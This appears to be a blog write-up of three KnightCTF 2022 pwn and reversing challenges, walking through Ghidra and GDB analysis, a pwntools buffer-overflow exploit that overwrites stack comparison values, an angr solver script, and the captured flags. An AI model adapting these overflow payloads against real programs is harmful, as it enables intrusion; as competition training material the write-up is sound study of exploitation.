---
title: KnightCTF pwn challenges writeup
author: jopraveen
date: 2022-01-23
categories: [CTFtime,KinghtCTF]
tags: [pwn,rev]
---

## What's your name [50 points]
- They gave us a zip file to download, so lets unzip it and add the binary file to GHIDRA

#### Main function
![disas-main](https://i.imgur.com/zmeG6el.png)
- gets() is vulnerable to buffer overflow
- in line 14 they're checking the value 100 is still in that variable or not
- If we overwrite that variable then the if condition will be statisfied means the value 100 will be overwritten
- So we can get the flag
- Ok how we can do that?
  - char **user_input** array can store upto 60 bytes
  - in memory after the user_input there will be the value of the integer (100)
  - so if we give more than 60 bytes it'll overwrite that integer
  - let's try that

![](https://i.imgur.com/Ymq1znG.png)
- Now let's try this at remote server

![](https://i.imgur.com/LPrmzMh.png)
- Nice we got our flag `KCTF{bAbY_bUfF3r_0v3Rf1Ow}`

------------

## What's your name 2 [100 points]
- They gave us a zip file to download, so lets unzip it and add the binary file to GHIDRA

#### Main function
- In ghidra we can reaname a variable by pressing `L` or right click it and do `rename variable`
- And we can add comments too (by pressing `;` semicolon in that particular line)
- That's what I did here, so don't confuse coz  it's different.. It's fully for your understanding purpose

![](https://i.imgur.com/TPBHQGG.png)

- I think I explained in the picture so it's enough to understand the vulnerablity
, lets skip to the exploitation part
- In line 22 there are  two condition checks
- One with **0x5445454c** , anther one with **0x534b544e**
- So we need to overwrite those values
- First let's find in which offset they are located
- Let's open it with gdb and disassemble the main function

![](https://i.imgur.com/FN99TjA.png)
- Let's set breakpoints in both compare instructions

![](https://i.imgur.com/QRXxeAW.png)
- run it. I'm giving a pattern here as input

![](https://i.imgur.com/Wo7xzUi.png)
- We hit our first break point, let see what's in **eax** register

![](https://i.imgur.com/UUpEc4w.png)
- So we need to place **0x5445454c** at 76th position
- Before going to next breakpoint we need to set this register value as **0x5445454c**
- `set $eax=0x5445454c` and continue
- Then only it jumps to next comparison, otherwise it directly exits
- Now we hit our 2nd breakpoint, let's see what's in **eax** register

![](https://i.imgur.com/DR0fvjb.png)
- So we need to place **0x534b544e** at 72nd position
- Fine now let's write our exploit
- Don't forget we need to convert these values into little endian format

#### Exploit script
```python
#!/usr/bin/python3
from pwn import *
p = process('whats_your_name_two')

payload = b'A'*72 # fill 72 bytes with junk

''' 
>>> from pwn import *
>>> p64(0x534b544e)
b'NTKS\x00\x00\x00\x00'
our second argument starting at 76th position, 
so let's leave the nullbytes and take only "NTKS"
'''
payload += b'NTKS'
payload += p64(0x5445454c) # here we can send with null bytes, no problems

p.sendline(payload)
p.interactive()
```
- Nice it works, let's send this in remote server

![](https://i.imgur.com/PU4zjdR.png)
- Cool we got our flag `KCTF{bUfF3r_0v3Rf1Ow_i5_fUn_r1Gh7}`

-------

## Hackers Vault [100 points]
- They gave us a zip file to download, so lets unzip it and add the binary file to GHIDRA
- I was concentrating on other challenge so I automated this challenge with angr

#### angr script
```python
#!/usr/bin/python3
import angr
import claripy
import sys

good_address = 0x0040124a
bad_address = 0x00401288
base_addr = 0x00400000
flag_length = 6
binary = './hackers_vault'

proj=angr.Project(binary,load_options={'auto_load_libs':False},main_opts={'base_addr':base_addr})
flag=[claripy.BVS('flag%i'%i,8) for i in range(flag_length)]

flag_concat=claripy.Concat(*flag + [claripy.BVV("\n")])
state=proj.factory.entry_state(stdin=flag_concat) 
for i in flag: 
    state.solver.add(i>=32)
    state.solver.add(i<=127)
simgr=proj.factory.simgr(state)
simgr.explore(find=good_address,avoid=bad_address)
if simgr.found:
    simulation=simgr.found[0]
    print(simulation.posix.dumps(sys.stdin.fileno()))
else:
    print("FAILURE")
```

- I know it's too much for this
- But it works, that's what we need

![](https://i.imgur.com/J5rD8Q7.png)
- IN REMOTE

![](https://i.imgur.com/VvuvDAY.png)
- flag `KCTF{b1NaRy_3xOpL0iTaT1On_r0cK5}`
- That's all for this category, easy pwns 😛
    
    
    
    
    
